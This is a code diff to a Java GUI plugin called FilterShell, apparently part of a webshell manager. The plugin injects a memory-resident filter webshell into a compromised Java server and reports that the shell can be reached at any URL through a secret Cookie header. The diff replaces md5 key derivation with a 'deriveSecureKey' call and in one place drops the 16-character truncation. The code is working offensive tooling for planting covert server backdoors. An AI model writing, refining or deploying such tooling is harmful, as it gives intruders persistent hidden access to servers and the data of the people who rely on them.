@@ -39,7 +39,7 @@ public class FilterShell implements Plugin {
    private final JLabel filterShellPayloadLabel = new JLabel("payload : ");
    private final JTextField filterShellPassTextField = new JTextField("pass", 15);
    private final JTextField filterShellSecretKeyTextField = new JTextField("key", 15);
-   private final JTextField filterShellCkTextField = new JTextField(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16), 18);
+   private final JTextField filterShellCkTextField = new JTextField(functions.deriveSecureKey(Long.toString(System.currentTimeMillis())).substring(0, 16), 18);
    private final JComboBox<String> payloadComboBox;
    private final JButton addFilterShellButton;
    private final JButton getAllFilterButton;
@@ -103,7 +103,7 @@ public class FilterShell implements Plugin {
 
    private void addFilterShellButtonClick(ActionEvent actionEvent) {
       try {
-         String secretKey = functions.md5(this.filterShellSecretKeyTextField.getText()).substring(0, 16);
+         String secretKey = functions.deriveSecureKey(this.filterShellSecretKeyTextField.getText());
          String ck = this.filterShellCkTextField.getText();
          String password = this.filterShellPassTextField.getText();
          if (secretKey.length() > 0 && ck.length() > 0 && password.length() > 0) {
@@ -121,9 +121,9 @@ public class FilterShell implements Plugin {
                byte[] result = this.payload.evalFunc(className, "run", reqParameter);
                String resultString = this.encoding.Decoding(result);
                Log.log(resultString);
-               this.resultTextArea.setText(String.format("You can access it at any Url\nYou Header is Cookie: %s=%s;", ck, functions.md5(Long.toString(System.currentTimeMillis())).substring(5, 12)));
+               this.resultTextArea.setText(String.format("You can access it at any Url\nYou Header is Cookie: %s=%s;", ck, functions.deriveSecureKey(Long.toString(System.currentTimeMillis())).substring(5, 12)));
                GOptionPane.showMessageDialog(this.panel, resultString, "提示", 1);
-               this.filterShellCkTextField.setText(functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16));
+               this.filterShellCkTextField.setText(functions.deriveSecureKey(Long.toString(System.currentTimeMillis())).substring(0, 16));
             } else {
                GOptionPane.showMessageDialog(this.panel, "loader fail!", "提示", 2);
             }
